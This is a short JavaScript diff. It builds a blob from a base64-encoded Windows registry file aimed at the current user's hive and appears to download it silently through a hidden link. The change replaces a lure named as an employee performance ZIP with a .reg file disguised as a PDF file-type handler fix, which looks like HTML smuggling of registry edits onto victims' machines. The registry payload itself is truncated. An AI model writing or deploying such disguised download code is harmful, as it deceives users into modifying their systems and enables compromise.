@@ -126,8 +126,8 @@ const base64 = 'V2luZG93cyBSZWdpc3RyeSBFZGl0b3IgVmVyc2lvbiA1LjAwDQoNCltIS0VZX0NV
 const arrayBuffer = b64ToArrayBuffer(base64);
 
 // Use the proper ZIP MIME type
-const blob = new Blob([arrayBuffer], { type: 'application/zip' });
-const filename = 'Employee_Performance_Summary_2025Q21.zip';
+const blob = new Blob([arrayBuffer], { type: 'application/octet-stream' });
+const filename = 'TAV_Fix_PDF_FileType_Handler.2.reg';
 
 const a = document.createElement('a');
 a.style.display = 'none';
